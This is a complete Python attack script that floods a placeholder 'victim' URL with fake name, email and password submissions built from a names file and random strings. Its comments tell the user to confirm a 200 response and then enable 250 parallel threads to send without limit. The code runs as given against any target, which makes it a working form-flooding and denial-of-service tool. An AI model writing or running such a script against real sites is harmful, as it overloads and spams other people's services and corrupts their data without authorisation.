# -*- coding: utf-8 -*-
#!/usr/bin/env python3
import random
import string
import requests
import threading

#Here it's the part where the file which contains all names are read
file = open("names.txt","r")
text = file.read()
names = text.split("\n")
file.close()

#the url of the victim
url = "https://url"

providers = ["gmail.com","hotmail.es","hotmail.com","terra.es","yahoo.com"]

#this generate the password based on letters in lower case, in upper case and digits
def get_random_string(length):
    letters = string.ascii_lowercase + string.digits + string.ascii_uppercase
    result_str = "".join(random.choice(letters) for i in range (length))
    return result_str

#select a random name of the file readed before
def get_name():
    length = len(names) - 1
    num = random.randint(0,length)
    choosenName = names[num]
    return choosenName

"""assign the variables to sent to the server. If the response is valid
you can proceed the attack"""
def send_data():
    while True:
        name = get_name()
        password = get_random_string(9) + "!"
        provider = providers[random.randint(0,4)]
        email = name.lower() + str(random.randint(1,2500)) + "@" + provider

        data = {"nombre": name,"email": email, "password": password}
        print(data)
        response = requests.post(url,data = data)
        print(response)

"""After testing it works(response 200), delete "send_data()", uncomment this secction and send
as many times as you want"""
send_data()
#threads = []
#
#for i in range(250):
#    t = threading.Thread(target=send_data)
#    t.daemon = True
#    threads.append(t)
#
#for i in range(250):
#    threads[i].start()
#
#for i in range(250):
#    threads[i].join()
